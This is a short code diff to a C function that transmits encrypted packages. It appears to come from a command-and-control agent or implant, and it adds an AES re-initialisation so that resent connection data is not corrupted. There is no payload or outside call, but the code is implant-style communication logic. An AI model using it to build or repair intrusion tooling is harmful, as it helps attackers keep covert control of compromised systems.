@@ -267,6 +267,10 @@ BOOL PackageTransmitNow(
         if ( Package->Destroy ) {
             PackageDestroy( Package ); Package = NULL;
         } else if ( Package->Encrypt ) {
+            /* AesXCryptBuffer advances the IV inside the context. re-init it
+             * before the restore-decrypt, otherwise the buffer (e.g. the
+             * first connect package we might have to resend) gets corrupted. */
+            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
     } else {
